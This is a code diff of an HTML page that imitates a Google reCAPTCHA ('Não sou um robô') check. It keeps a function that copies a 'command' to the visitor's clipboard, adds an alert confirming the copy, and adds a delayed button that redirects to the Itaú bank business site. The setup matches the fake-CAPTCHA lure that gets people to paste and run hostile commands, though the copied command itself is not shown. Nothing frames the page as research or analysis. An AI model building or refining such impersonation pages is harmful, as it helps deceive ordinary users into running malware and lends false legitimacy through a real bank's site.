@@ -21,7 +21,7 @@
             border-radius: 5px;
             padding: 20px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 360px;
+            width: 400px;
             text-align: left;
         }
 
@@ -34,6 +34,7 @@
         .captcha-header input[type="checkbox"] {
             width: 20px;
             height: 20px;
+            cursor: pointer;
         }
 
         .captcha-header label {
@@ -43,14 +44,14 @@
 
         .captcha-header .captcha-logo {
             margin-left: auto;
+            transition: transform 1s ease;
         }
 
         .captcha-footer {
-            margin-top: 20px;
-            font-size: 12px;
+            margin-top: 5px;
+            font-size: 10px;
             color: #888;
-            display: flex;
-            justify-content: space-between;
+            text-align: right;
         }
 
         .verification-box {
@@ -95,10 +96,15 @@
             padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
+            display: none;
         }
 
         .verification-box button:hover {
             background-color: #0056b3;
+        }
+
+        .captcha-header input:checked + label + .captcha-logo {
+            transform: rotate(360deg);
         }
     </style>
 </head>
@@ -125,7 +131,7 @@
             <p class="verification-code">
                 <span class="verified">✔ "Não sou um robô - ID do reCAPTCHA: 2417"</span>
             </p>
-            <button onclick="copiarTexto()">VERIFICAR</button>
+            <button id="verify-button" onclick="redirectToSite()">VERIFICAR</button>
         </div>
     </div>
 
@@ -133,12 +139,21 @@
         function showVerification() {
             const checkbox = document.getElementById("captcha-checkbox");
             const verificationBox = document.getElementById("verification-box");
+            const verifyButton = document.getElementById("verify-button");
 
             if (checkbox.checked) {
                 verificationBox.style.display = "block";
+                setTimeout(() => {
+                    verifyButton.style.display = "inline-block";
+                }, 4000); // 4 segundos
             } else {
                 verificationBox.style.display = "none";
+                verifyButton.style.display = "none";
             }
+        }
+
+        function redirectToSite() {
+            window.location.href = "https://www.itau.com.br/empresas";
         }
 
         function copiarTexto() {
@@ -151,6 +166,7 @@
                 textarea.select();
                 document.execCommand('copy');
                 document.body.removeChild(textarea);
+                alert("Comando copiado para a área de transferência!");
             } catch (err) {
                 console.error("Erro ao copiar texto: ", err);
             }
@@ -159,3 +175,4 @@
 
 </body>
 </html>
+
